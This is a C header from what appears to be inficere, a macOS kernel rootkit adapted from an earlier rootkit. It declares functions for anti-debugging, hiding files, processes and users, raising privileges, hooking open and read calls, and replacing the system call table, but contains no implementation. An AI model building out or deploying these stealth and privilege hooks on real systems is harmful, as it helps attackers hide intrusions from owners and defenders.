/*
 * Copyright (c) fG!, 2011, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Original code from "onyx-the-black-cat". Modified by Enzo Matsumiya (@enzolovesbacon).
 *
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef inficere_anti_h
#define inficere_anti_h

#include <mach/mach_types.h>
#include "proc.h"
#include "sysproto.h"

#define KEXTNAME		"inficere.kext"
#define BUNDLE_PLIST		"com.enzo.inficere.plist"

#define MAX_FILES_TO_HIDE	8

kern_return_t anti_ptrace(int cmd);
kern_return_t anti_sysctl(int cmd);
kern_return_t anti_kill(int cmd);
kern_return_t hide_file(int cmd);
kern_return_t set_seteuid(void);
kern_return_t hook_open_nc(int cmd);
kern_return_t hook_read_nc(int cmd);
kern_return_t hide_user(int cmd);

kern_return_t set_orig_sysent(void);
kern_return_t set_hooked_sysent(void);

struct proc *find_proc(int pid);

#endif
